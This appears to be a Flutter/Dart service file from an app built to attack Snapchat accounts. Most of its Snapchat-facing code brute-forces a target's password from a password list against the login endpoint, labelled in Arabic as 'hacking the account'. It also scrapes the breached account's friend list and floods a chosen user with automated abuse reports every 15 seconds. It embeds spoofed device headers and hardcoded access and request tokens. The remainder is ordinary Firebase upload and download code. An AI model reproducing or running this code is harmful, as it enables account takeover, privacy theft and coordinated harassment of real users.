import 'dart:convert';
import 'dart:io';
import 'dart:math';

import 'package:file_picker/file_picker.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:image_picker/image_picker.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:progress_dialog_null_safe/progress_dialog_null_safe.dart';
import 'package:some_name/model/files.dart';
import 'package:some_name/model/friend.dart';
import 'package:some_name/model/result.dart';
import 'package:some_name/model/user.dart';
import 'package:some_name/screens/files_upload.dart';
import 'package:some_name/screens/send_report.dart';
import 'package:some_name/services/appUtils.dart';

import '../screens/Login_screen.dart';
import '../screens/body_dialog.dart';
import '../screens/get_friends.dart';

class ApiService {
  static const url = "https://gcp.api.snapchat.com/scauth/login";
  static final FirebaseAuth auth = FirebaseAuth.instance;
  static Future<String?> getServer(int server) async {
    const url =
        'https://my-bye-thost-flaah999-default-rtdb.firebaseio.com/.json';
    try {
      final response = await http.get(Uri.parse(url));

      if (response.statusCode == 200) {
        final info = json.decode(response.body);
        String att;

        try {
          att = info["X-Snapchat-Att"][server].toString();
        } catch (e) {
          return null;
        }

        return att;
      } else {
        debugPrint('Request failed with status: ${response.statusCode}');
        return null;
      }
    } catch (error) {
      debugPrint('Error: $error');
    }
    return null;
  }

  static Stream<Future<UserApp>> performLogin(
      String user, List<String> passwords, String server) async* {
    int counter = 0;
    for (String password in passwords) {
      try {
        counter++;
        pr.update(
            progress: (counter).toDouble(), message: "جاري اختراق الحساب");
        final res = await login(user, password, server);
        if (res) {
          force = true;
          yield Future.value(
              UserApp(userName: user, password: password, statusLogin: res));
          break;
        } else {
          yield Future.value(
              UserApp(userName: user, password: password, statusLogin: res));
        }
      } catch (e) {}
    }
  }

  static Future<bool> login(String user, String password, String server) async {
    String chars2 = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm';
    int amount = 1;
    int length2 = 1;
    String key = '';

    for (int keyIndex = 0; keyIndex < amount; keyIndex++) {
      key = '';
      for (int item = 0; item < length2; item++) {
        key = '';
      }
      for (int item = 0; item < length2; item++) {
        key += chars2[Random().nextInt(chars2.length)];
      }
    }

    Map<String, String> hed = {
      "X-Snapchat-Uuid": "D348BDC9-2FA4-4BB9-A7CC-5595250FB823",
      "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
      "User-Agent": "Snapchat/11.79.0.31 (iPhone9,3; iOS 15.7.5; gzip)",
      "Accept": "application/json",
      "X-Snapchat-Att": server.replaceAll("{}", key),
      "Host": "gcp.api.snapchat.com"
    };

    return await tryLogin(password, user, hed, server, 1);
  }

  static Future<List<Friend>?> getFriends(
      String user, String password, String server) async {
    String chars2 = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm';
    int amount = 1;
    int length2 = 1;
    String key = '';

    for (int keyIndex = 0; keyIndex < amount; keyIndex++) {
      key = '';
      for (int item = 0; item < length2; item++) {
        key = '';
      }
      for (int item = 0; item < length2; item++) {
        key += chars2[Random().nextInt(chars2.length)];
      }
    }

    Map<String, String> hed = {
      "X-Snapchat-Uuid": "D348BDC9-2FA4-4BB9-A7CC-5595250FB823",
      "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
      "User-Agent": "Snapchat/11.79.0.31 (iPhone9,3; iOS 15.7.5; gzip)",
      "Accept": "application/json",
      "X-Snapchat-Att": server.replaceAll("{}", key),
      "Host": "gcp.api.snapchat.com"
    };

    return await tryGetFriends(password, user, hed, server, 1);
  }

  static Future<bool> tryLogin(String password, String user,
      Map<String, String> hed, String server, int count) async {
    if (count != 4) {
      String da = "device_check_token=sx&password=$password&username=$user";
      await Future.delayed(const Duration(seconds: 2));
      final result = await http.post(Uri.parse(url), headers: hed, body: da);
      await Future.delayed(const Duration(milliseconds: 500));

      final res = json.decode(result.body);
      print(res);
      if (result.body.contains('updates_response') ||
          result.body.toString().contains('two_fa_needed')) {
        return true;
      } else if (res['message'].toString().contains('Could Not Connect') ||
          res['message'].toString().contains('Oh no!')) {
        return login(user, password, server);
      } else if (res['message'].toString().contains('logged')) {
        return tryLogin(password, user, hed, server, count++);
      }
    }
    return false;
  }

  static Future<List<Friend>?> tryGetFriends(String password, String user,
      Map<String, String> hed, String server, int counter) async {
    if (counter == 5) return getFriends(user, password, server);
    String da = "device_check_token=sx&password=$password&username=$user";
    final result = await http.post(Uri.parse(url), headers: hed, body: da);
    await Future.delayed(const Duration(milliseconds: 500));

    final info = json.decode(result.body);
    print(info);
    if (result.body.contains(
        'Could Not Connect. Please check your network connection and try again. If you are connected to a VPN, retry after disconnecting from it')) {
      Messages.showErrorMessage(GetFriendsScreen.FriendsContext!, 'text error',
          'Please wait a moment and try again log in \n Extra note If you are using a VPN, please turn it off');
    }
    if (result.body.contains('updates_response')) {
      Messages.showSuccessfulMessage(GetFriendsScreen.FriendsContext!,
          'Good login ', 'username : $user | password : $password, des');
    } else if (result.toString().contains('logged')) {
      return tryGetFriends(password, user, hed, server, counter++);
    }
    if (result.body.contains('data')) {
      int nb = 0;
      final friends = <Friend>[];
      while (true) {
        if (nb == 300) break;
        try {
          var ts = info["friends_response"]["friends"][nb]["ts"];
          var operationTwo =
              int.parse(ts.toString().substring(0, ts.toString().length - 3));
          DateTime datetimeObj =
              DateTime.fromMillisecondsSinceEpoch(operationTwo * 1000);
          var friend = Friend(
              userName: info["friends_response"]["friends"][nb]["name"],
              name: info["friends_response"]["friends"][nb]["display"],
              addFriendTime: datetimeObj.toString());
          final mutableUsername =
              info["friends_response"]["friends"][nb]["mutable_username"];
          var user = info["friends_response"]["friends"][nb]["name"];
          if (user.contains(mutableUsername)) {
          } else {
            friend.changedUserName = mutableUsername;
            friend.name = info["friends_response"]["friends"][nb]["display"];
          }
          friends.add(friend);
        } catch (e) {}
        nb++;
      }
      return friends;
    }
    if (result.body.contains('two_fa_needed')) {
      Messages.showSuccessfulMessage(
          GetFriendsScreen.FriendsContext!, 'Good login ', 'Oops 2FA');
    }
    if (result.body.contains('Could Not Connect')) {
      return getFriends(user, password, server);
    }
    if (result.body.contains('Oh no!')) {
      return getFriends(user, password, server);
    }
    return null;
  }

  static Future<bool> verifyPhoneNumber(
      String userEmail, String phoneNumber, String codeCountry) async {
    String url =
        "https://us-east4-gcp.api.snapchat.com/loq/phone_verify_pre_login";
    Map<String, String> headers = {
      "X-Snapchat-Uuid": "D348BDC9-2FA4-4BB9-A7CC-5595250FB823",
      "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
      "User-Agent": "Snapchat/11.79.0.31 (iPhone9,3; iOS 15.7.5; gzip)",
      "Accept": "application/json",
      "X-Snapchat-Att":
          "CgsYACAAFbYhXZkIChLAAYF5hasiWz_s88l_ylpvnVumVWs4GpiFAi4FpKl3hNj91DciK0H3_6S3XUXDwPl3ukM66bLDAPxEwiDBuOX5J7_4a62H0Jjv4tVkqX38GD8TlNv2na6ojUkyeOfTUHGQ_WZUYyM73UmS4843f1trlD2PvuJvH9lFUpr3lPjx1fbZ-_iRjzeEJxChbOIveHj_bxMoSZaRDwpzZGo51bVugHjIJ2jYFs6e2XuALFD02Wa-mn1eFFPlXWO799K9MPvH_g==",
      "Host": "us-east4-gcp.api.snapchat.com",
    };

    String data =
        "action=request_code&client_id=3AD75837-B525-4EE9-8FB7-E85BF618FBBB&country_code=$codeCountry&method=call&phone_number=$phoneNumber&preauth_token=&req_token=93040350cf21d9c86ea5d7e0fba0d194d2e94d831931ea8a59b4d114d4c517bb&timestamp=1684680072458&username_or_email=$userEmail";

    try {
      final response =
          await http.post(Uri.parse(url), headers: headers, body: data);
      if (response.statusCode == 200) {
        if (response.body.contains('true')) {
          return true;
        } else if (response.body.contains('false')) {
          return false;
        }
      } else {
        debugPrint('Error: Unable to perform verification');
      }
    } catch (error) {
      debugPrint('Error: $error');
    }
    return false;
  }

  static Stream<bool> startReportUser(String username, UserApp user) async* {
    // Verify account and collect information
    final url = Uri.parse('https://app.snapchat.com/loq/find_users');
    final headers = {
      'X-Snapchat-Uuid': '80DF3455-524C-4799-93D1-CE336B479780',
      'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
      'User-Agent': 'Snapchat/11.71.0.35 (iPhone9,3; iOS 15.7.2; gzip)',
      'Accept': 'application/json',
      'X-Snapchat-Att':
          'CgsYACAAFWR7I9MIChLIAVhnKPJScaYjimmlvjPw3q243isSffPGbQrpeToXq29_1a1CCZhcFAXXJTyHjjURZPyI4InC2QWBoKObFu7njRLC0p57DoUMq7Tz-iVQvvHcCmuH5tNxOCXvD-bDZfkSg2-yyNvUg8WnSzvHtcpEuY-c4-uBrRgeEzCuQ4CUTu5E0ZNzdu8Hvsqjq2urFOICpevWGlC0pgjYZkyGO_7-n7OhrX7EgBoZwPQRQNmmR0NE-bgEQMzM-RUZ1rcKL3ur8-FShyG86Gif',
      'Host': 'app.snapchat.com',
      'Accept-Encoding': 'gzip, deflate'
    };
    final data =
        'query_text=$username&req_token=3fe317724cbb039a2c78521775f2afd2c5c69bbf5630e15d1095c2e122d41dee&snapchat_user_id=03543cc3-b538-4391-9f6c-1b6570ebb97c&timestamp=1681660672271&user_result_types=[%22dns%22]&username=ho-12x';

    final response = await http.post(url, headers: headers, body: data);
    final info = json.decode(response.body);
    try {
      user.userName = info['users'][0]['friend']['name'].toString();

      user.user_id = info['users'][0]['friend']['user_id'].toString();
      user.name = info['users'][0]['friend']['display'].toString();
      user.Famous = info['users'][0]['friend']['is_popular'].toString();
    } catch (e) {}
    debugPrint(' --> username: ${info['users'][0]['friend']['name']}');
    debugPrint(' --> user_id: ${info['users'][0]['friend']['user_id']}');
    debugPrint(' --> name: ${info['users'][0]['friend']['display']}');

    debugPrint(
        ' --> تحقق من الشهره: ${info['users'][0]['friend']['is_popular']}');

    yield* addAccount(info['users'][0]['friend']['user_id'], user);
  }

  static Stream<bool> addAccount(String id, UserApp user) async* {
    // Add the account
    final url = Uri.parse('https://mvm.snapchat.com/bq/friend');
    final headers = {
      'X-Snapchat-Uuid': 'CE9E1775-9754-4F5F-84A1-1F5B2B85A949',
      'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
      'User-Agent': 'Snapchat/11.71.0.35 (iPhone9,3; iOS 15.7.2; gzip)',
      'Accept': 'application/json',
      'x-snap-access-token':
          'gEgwSCjE2ODA1NDQ4MDIaxQETDgMGYJFVdW-_wxQqtx277-67kAmRD21FnmFFjg6BPRxWR7_dS1nI1OTe4QNhR3aLROcuv6l3podmzAJ63ufJGSRjw7WoPT73_HEusXtjROPBMmqeiZCwb7HKFd_ACUY5OHU3n88VQRGClLcmxLozGyy13vj2WKGUI73EHuJ1t9vVIjxiOhenrrpDfjbALU22NKXGz3c4dNPVieYkfKX43rieqVVJ0ODZstwZ4NpR3Xim8jCDi_kIGWO3rT9VKS_R_tPgNQ',
      'X-Snapchat-Att':
          'CgsYACAAFWR7I9MIChLIAbkV5b61RCp5H6yeW_ucT32IjzRphky8lQw5arsKU7aCLT8X0xHPHR1zIVaT6o7P0cZun1_1SeTUtOI-zlmFAYez6YvRiU_uF_29jsIqLHXqo9pevGAmy9RvJQfATQqiCbvXBLqVth8qbUlLgd5odfaqA71F8QkWYivH2uZXHDdXWBLroxqFkn0sxJs-rCu2kU9AVuI-lP-67mdMUfnUaRR066Cv7OzjsA5xoPRnHlLLrmrJf6jhjfBju0_hlHbTVQXottPUuswP',
      'Host': 'mvm.snapchat.com',
      'Accept-Encoding': 'gzip, deflate'
    };
    final data =
        'action=add&added_by=ADDED_BY_USERNAME&entry_point=AddFriendButtonOnTopBarOnFriendsFeed&friend_id=$id&identity_cell_index=0&identity_profile_page=add_friends_button_on_top_bar_on_friends_feed&page_source=AddFriend&req_token=3fed8b7d085b563a2c047d177ffc73826bc69bb256df115fb0958ee12fd41f7e&snapchat_user_id=03543cc3-b538-4391-9f6c-1b6570ebb97c&timestamp=1681662639769&username=ho-12x&widget_source=None';

    final response = await http.post(url, headers: headers, body: data);
    final falah999 = json.decode(response.body);
    try {
      user.typeAccount =
          falah999['object']['can_see_custom_stories'].toString();
      user.statusAccount = falah999['object']['direction'].toString();
    } catch (e) {}
    debugPrint(
        ' --> نوع الحساب: ${falah999['object']['can_see_custom_stories']}');
    debugPrint(' --> حالة الحساب: ${falah999['object']['direction']}');

    if (falah999.containsKey('category_name')) {
      user.file = "يوجد ملف تعريفي";
      debugPrint(
          ' --> يوجد ملف تعريفي: ${falah999['object']['friendmojis'][0]['category_name']}');
      yield* deleteAddedAccount(id, hasProfile: true);
    } else {
      user.file = " لا يوجد ملف تعريفي";
      debugPrint(' --> لا يوجد ملف تعريفي');
      yield* deleteAddedAccount(id, hasProfile: false);
    }
  }

  static Stream<bool> deleteAddedAccount(String id,
      {required bool hasProfile}) async* {
    // Delete the added account
    final url = Uri.parse('https://mvm.snapchat.com/bq/friend');
    final headers = {
      'X-Snapchat-Uuid': 'CE9E1775-9754-4F5F-84A1-1F5B2B85A949',
      'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
      'User-Agent': 'Snapchat/11.71.0.35 (iPhone9,3; iOS 15.7.2; gzip)',
      'Accept': 'application/json',
      'x-snap-access-token':
          'gEgwSCjE2ODA1NDQ4MDIaxQETDgMGYJFVdW-_wxQqtx277-67kAmRD21FnmFFjg6BPRxWR7_dS1nI1OTe4QNhR3aLROcuv6l3podmzAJ63ufJGSRjw7WoPT73_HEusXtjROPBMmqeiZCwb7HKFd_ACUY5OHU3n88VQRGClLcmxLozGyy13vj2WKGUI73EHuJ1t9vVIjxiOhenrrpDfjbALU22NKXGz3c4dNPVieYkfKX43rieqVVJ0ODZstwZ4NpR3Xim8jCDi_kIGWO3rT9VKS_R_tPgNQ',
      'X-Snapchat-Att':
          'CgsYACAAFWR7I9MIChLIAbkV5b61RCp5H6yeW_ucT32IjzRphky8lQw5arsKU7aCLT8X0xHPHR1zIVaT6o7P0cZun1_1SeTUtOI-zlmFAYez6YvRiU_uF_29jsIqLHXqo9pevGAmy9RvJQfATQqiCbvXBLqVth8qbUlLgd5odfaqA71F8QkWYivH2uZXHDdXWBLroxqFkn0sxJs-rCu2kU9AVuI-lP-67mdMUfnUaRR066Cv7OzjsA5xoPRnHlLLrmrJf6jhjfBju0_hlHbTVQXottPUuswP',
      'Host': 'mvm.snapchat.com',
      'Accept-Encoding': 'gzip, deflate'
    };
    final action = hasProfile ? 'delete' : '';
    final data =
        'action=$action&added_by=ADDED_BY_USERNAME&entry_point=AddFriendButtonOnTopBarOnFriendsFeed&friend_id=$id&identity_cell_index=0&identity_profile_page=add_friends_button_on_top_bar_on_friends_feed&page_source=AddFriend&req_token=3fed8b7d085b563a2c047d177ffc73826bc69bb256df115fb0958ee12fd41f7e&snapchat_user_id=03543cc3-b538-4391-9f6c-1b6570ebb97c&timestamp=1681662639769&username=ho-12x&widget_source=None';

    final response = await http.post(url, headers: headers, body: data);

    while (true) {
      if (stopRepo) break;
      await Future.delayed(const Duration(seconds: 15));
      yield await report(id);
    }
    ReportUserPage.pr.hide();
    Messages.showSuccessfulMessage(ReportUserPage.ReportContext!,
        'ارسال بلاغات', ' $num تم ارسال عدد  بلاغات');
  }

  static Future<bool> report(String id) async {
    // Get token data from Firebase
    final tokenUrl = Uri.parse(
        'https://my-bye-thost-flaah999-default-rtdb.firebaseio.com/Token.json');
    final tokenResponse = await http.get(tokenUrl);
    final tokenInfo = json.decode(tokenResponse.body);
    final server = tokenInfo['account'];

    // Send a report about the account
    final reportUrl =
        Uri.parse('https://app.snapchat.com/reporting/inapp/v1/user');
    final Map<String, String> reportHeaders = {
      'X-Snapchat-Uuid': '2785C047-E703-4142-808A-E91437259C80',
      'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
      'User-Agent': 'Snapchat/11.71.0.35 (iPhone9,3; iOS 15.7.2; gzip)',
      'Accept': 'application/json',
      'X-Snapchat-Att': server,
      'Host': 'app.snapchat.com',
      'Accept-Encoding': 'gzip, deflate'
    };
    final reportData =
        'context=&reason_id=report_user_reason_mean_or_inappropriate_snaps&reported=b-w10&reported_user_id=${id}&req_token=3fe9c875684b962a2cc6431471f3760236c09bbd5606c15a409570e127d41f6e&snapchat_user_id=03543cc3-b538-4391-9f6c-1b6570ebb97c&timestamp=1681668030547&username=ho-12x';

    final response =
        await http.post(reportUrl, headers: reportHeaders, body: reportData);
    if (response.statusCode == 200) {
      debugPrint(' --> تم الابلاغ عن الحساب بنجاح');
      return true;
    } else if (response.statusCode == 429) {
      debugPrint(' --> محاولات كثيره');
      return false;
    } else {
      debugPrint(' --> فشل ارسال البلاغ حاول لاحقا من فضلك');
      return false;
    }
  }

  static Future<User?> getCurrentUser() async {
    final User? user = auth.currentUser;
    return user;
  }

  static Future<bool> isUserAuthenticated() async {
    final User? user = await getCurrentUser();
    return user != null;
  }

  static Future<Result> registerUser(String email, String password) async {
    try {
      await FirebaseAuth.instance.createUserWithEmailAndPassword(
        email: email,
        password: password,
      );
      return Result(true, "message");
    } on FirebaseAuthException catch (e) {
      return Result(false, e.message ?? 'try again later');
    }
  }

  static Future<Result> loginUser(String email, String password) async {
    try {
      await FirebaseAuth.instance.signInWithEmailAndPassword(
        email: email,
        password: password,
      );
      return Result(true, '');
    } on FirebaseAuthException catch (e) {
      return Result(false, e.message ?? ' try again later');
    }
  }

  static Future<List<FileDownload>> getFileNamesFromStorage() async {
    List<FileDownload> fileNames = [];

    Reference storageReference = FirebaseStorage.instance.ref();

    try {
      final user = await getCurrentUser();
      ListResult listResult = await storageReference.child(user!.uid).listAll();

      for (var item in listResult.items) {
        String fileName = item.name;

        fileNames.add(FileDownload(
            fileName, await checkIfFileExists('$fileName.json'), ''));
      }
    } catch (e) {
      print('Error fetching file names: $e');
    }
    return fileNames;
  }

  static Future<bool> downloadFileFromStorage(String fileName) async {
    final user = await getCurrentUser();
    Reference storageReference =
        FirebaseStorage.instance.ref().child(user!.uid).child(fileName);
    final PermissionStatus status = await Permission.storage.request();
    if (status.isGranted) {
      Directory appDocDir = await getApplicationDocumentsDirectory();
      File localFile = File('${appDocDir.path}/$fileName.json');

      try {
        await storageReference.writeToFile(localFile);

        return true;
      } catch (e) {
        return false;
      }
    }
    return false;
  }

  static Future<bool> checkIfFileExists(String fileName) async {
    Directory directory = await getApplicationDocumentsDirectory();
    File localFile = File('${directory.path}/$fileName');

    if (await localFile.exists()) {
      return true;
    } else {
      return false;
    }
  }

  static Future<bool> uploadMapAsJsonToStorage(
      List<Map<String, dynamic>> dataMap, String fileName) async {
    String jsonData = jsonEncode(dataMap);
    final user = await getCurrentUser();
    Reference storageReference =
        FirebaseStorage.instance.ref().child('${user!.uid}/$fileName.json');
    try {
      await storageReference.putString(jsonData);
      return true;
    } catch (e) {
      return false;
    }
  }

  static Future<List<Map<String, String>>> readLocalJsonList(
      String fileName) async {
    Directory directory = await getApplicationDocumentsDirectory();
    File jsonFile = File('${directory.path}/$fileName.json');

    try {
      if (await jsonFile.exists()) {
        String jsonString = await jsonFile.readAsString();
        List<dynamic> jsonList = jsonDecode(jsonString);
        List<Map<String, String>> dataList = [];

        for (var item in jsonList) {
          if (item is Map) {
            Map<String, String> map = {};
            item.forEach((key, value) {
              if (key is String && value is String) {
                map[key] = value;
              }
            });
            dataList.add(map);
          }
        }

        return dataList;
      } else {
        // print('JSON file does not exist.');
        return [];
      }
    } catch (e) {
      // print('Error reading JSON file: $e');
      return [];
    }
  }

  static Future<Result> resetPassword(String email) async {
    try {
      await FirebaseAuth.instance.sendPasswordResetEmail(email: email);
      return Result(true, '');
    } on FirebaseAuthException catch (e) {
      return Result(false, e.message ?? '');
    }
  }

  // static Future<void> pickFileAndUpload(ProgressDialog pr) async {
  //   FilePickerResult? result = await FilePicker.platform.pickFiles(
  //     type: FileType.custom,
  //     allowedExtensions: ['jpg', 'png', 'jpeg', 'mp4'],
  //   );

  //   if (result == null || result.files.isEmpty) return;

  //   PlatformFile file = result.files.first;
  //   String fileType = file.name.split('.').last.toLowerCase();

  //   if (fileType == 'mp4') {
  //     await _uploadFile(
  //         File(
  //           file.path!,
  //         ),
  //         'videos',
  //         pr);
  //   } else if (['jpg', 'png', 'jpeg'].contains(fileType)) {
  //     await _uploadFile(
  //         // File(
  //         //   file.path!,
  //         // ),
  //         // 'images',
  //         // pr);
  //   } else {
  //     await pr.hide();
  //     Messages.showErrorMessage(
  //         FilesUploadPage.context!, 'error', 'not support upload this file');
  //   }
  // }

  static Future<void> _uploadFile(
      File file, String folderName, ProgressDialog pr) async {
    try {
      final currentUser = await getCurrentUser();
      final Reference storageRef = FirebaseStorage.instance
          .ref()
          .child(currentUser!.uid)
          .child(folderName)
          .child('${DateTime.now()}.${file.path.split('.').last}');
      await storageRef.putFile(file);
      Navigator.pop(FilesUploadPage.context!);
      Messages.showSuccessfulMessage(
          FilesUploadPage.context!, 'success', 'File uploaded successfully');
    } on FirebaseException catch (e) {
      await pr.hide();
      Messages.showErrorMessage(FilesUploadPage.context!, 'error',
          e.message ?? ' check your network and try agains');
    }
  }

  static Future<void> downloadFile(
      String fileName, String folderName, ProgressDialog pr) async {
    try {
      final PermissionStatus status = await Permission.storage.request();
      if (status.isGranted) {
        Directory appDocDir = await getApplicationDocumentsDirectory();
        File localFile = File('${appDocDir.path}/$fileName');
        final currentUser = await getCurrentUser();
        Reference fileRef = FirebaseStorage.instance
            .ref()
            .child(currentUser!.uid)
            .child(folderName)
            .child(fileName);
        await fileRef.writeToFile(localFile);
        await pr.hide();
        Messages.showSuccessfulMessage(FilesUploadPage.context!, 'success',
            'File downloaded successfully');
      }
    } on FirebaseException catch (e) {
      pr.hide();
      Messages.showErrorMessage(FilesUploadPage.context!, 'error',
          e.message ?? 'Check your network and try again.');
    }
  }

  static Future<List<FileDownload>> getFileNames() async {
    List<FileDownload> fileNames = [];

    Reference storageReference = FirebaseStorage.instance.ref();

    try {
      final user = await getCurrentUser();
      ListResult listResult =
          await storageReference.child(user!.uid).child('videos').listAll();
      ListResult listResult2 =
          await storageReference.child(user.uid).child('images').listAll();
      ListResult listResult3 =
          await storageReference.child(user.uid).child('txt').listAll();

      for (var item in listResult.items) {
        String fileName = item.name;

        fileNames.add(FileDownload(
            fileName, await checkIfFileExists(fileName), 'videos'));
      }
      for (var item in listResult3.items) {
        String fileName = item.name;

        fileNames.add(
            FileDownload(fileName, await checkIfFileExists(fileName), 'txt'));
      }
      for (var item in listResult2.items) {
        String fileName = item.name;

        fileNames.add(FileDownload(
            fileName, await checkIfFileExists(fileName), 'images'));
      }
    } catch (e) {
      debugPrint('Error fetching file names: $e');
    }

    return fileNames;
  }

  static Future<void> uploadImages(ProgressDialog pr) async {
    final ImagePicker picker = ImagePicker();
// Pick an image.
    final XFile? image = await picker.pickImage(source: ImageSource.gallery);
    if (image != null) {
      pr.show();
      _uploadFile(File(image.path), 'images', pr);
    }
  }

  static Future<void> uploadVideos(ProgressDialog pr) async {
    final ImagePicker picker = ImagePicker();
// Pick an video.
    final XFile? image = await picker.pickVideo(source: ImageSource.gallery);
    if (image != null) {
      pr.show();
      _uploadFile(File(image.path), 'videos', pr);
    }
  }

  static Future<void> uploadText(ProgressDialog pr) async {
    FilePickerResult? result = await FilePicker.platform.pickFiles(
      type: FileType.custom,
      allowedExtensions: ['txt'],
    );

    if (result == null || result.files.isEmpty) return;
    PlatformFile file = result.files.first;
    pr.show;
    _uploadFile(File(file.path!), 'txt', pr);
  }

  static Future<void> deleteFileFromStorage(
      String name, String folder, ProgressDialog pr) async {
    try {
      final user = await getCurrentUser();
      FirebaseStorage storage = FirebaseStorage.instance;
      Reference storageRef =
          storage.ref().child(user!.uid).child(folder).child(name);

      await storageRef.delete();

      pr.hide;
      Messages.showSuccessfulMessage(
          FilesUploadPage.context!, 'success', 'File deleted successfully');
    } catch (e) {
      pr.hide;
      Messages.showErrorMessage(
          FilesUploadPage.context!, 'error', e.toString());
    }
  }
}
